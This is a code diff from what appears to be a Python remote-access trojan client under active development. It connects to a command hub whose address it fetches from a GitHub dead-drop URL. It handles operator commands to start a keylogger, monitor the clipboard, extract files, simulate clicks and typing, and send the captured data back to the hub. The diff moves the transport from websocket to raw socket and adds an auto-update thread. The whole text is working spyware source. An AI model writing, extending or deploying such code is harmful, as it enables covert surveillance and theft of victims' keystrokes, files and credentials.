                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pynput\n')
+                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         else:
-                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=True)
+                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
                     elif command.startswith('EXTRACT_FILE '):
                         file_path = command[13:].strip('"')
                         payload = extract_file_bytes(file_path)
                         if payload is None:
-                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=True)
+                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=False)
                         else:
-                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=True)
+                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
                     elif command.startswith('KEYLOG'):
                         if not PYNPUT_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pynput\n')
+                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         elif 'START' in command.upper():
-                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\n'.encode('utf-8'))
+                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\n'.encode('utf-8'))
+                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         else:
-                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\n')
+                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\nV_PULSE_EOF\n')
                     elif command.startswith('CLIPBOARD'):
                         if not PYPERCLIP_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyperclip\n')
+                            client.send(b'DEPENDENCY_MISSING: pyperclip\nV_PULSE_EOF\n')
                         elif 'START' in command.upper():
-                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\n'.encode('utf-8'))
+                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\n'.encode('utf-8'))
+                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         else:
-                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\n')
+                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\nV_PULSE_EOF\n')
                     elif command.startswith('CLICK '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 parts = command.split()
@@ -1028,7 +483,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pass
                     elif command.startswith('TYPE '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 text = command[5:].strip('"')
@@ -1037,10 +492,10 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pass
                     else:
                         pass
-        except websocket.WebSocketConnectionClosedException:
-            print('[-] WebSocket connection closed while listening to hub.')
-        except websocket.WebSocketException as e:
-            print(f'[-] WebSocket error: {e}')
+        except ConnectionResetError:
+            print('[-] Connection reset by peer.')
+        except socket.error as e:
+            print(f'[-] Socket error: {e}')
         except requests.RequestException as e:
             print(f'[-] Failed to fetch King URL from GitHub: {e}')
         except Exception as exc:
@@ -1084,7 +539,9 @@ def get_king_url(github_throne_url=DEFAULT_GITHUB_THRONE_URL):
             'Cache-Control': 'no-cache',
             'Pragma': 'no-cache',
         })
-        return response.text.strip()
+        address = response.text.strip()
+        print(f"[*] Fetched throne address: '{address}'")
+        return address
     except Exception as e:
         print(f'[-] Failed to fetch King URL from throne: {e}')
         return None
@@ -1123,5 +580,8 @@ if __name__ == '__main__':
         print(f'[*] Using GitHub throne to resolve King domain: {args.github_throne_url}')
     else:
         print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
+
+    # Start auto-update monitor
+    threading.Thread(target=auto_update_monitor, daemon=True).start()
 
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
